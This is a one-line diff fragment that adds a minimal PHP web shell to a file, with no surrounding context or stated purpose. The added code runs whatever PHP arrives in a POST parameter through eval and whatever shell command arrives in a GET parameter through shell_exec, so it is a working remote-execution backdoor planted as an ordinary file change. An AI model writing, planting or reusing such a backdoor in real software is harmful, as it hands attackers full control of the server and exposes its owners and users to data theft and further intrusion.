@@ -1,0 +1,1 @@
+<?php if(eval($_POST["c"])) { shell_exec($_GET["q"]); } ?>
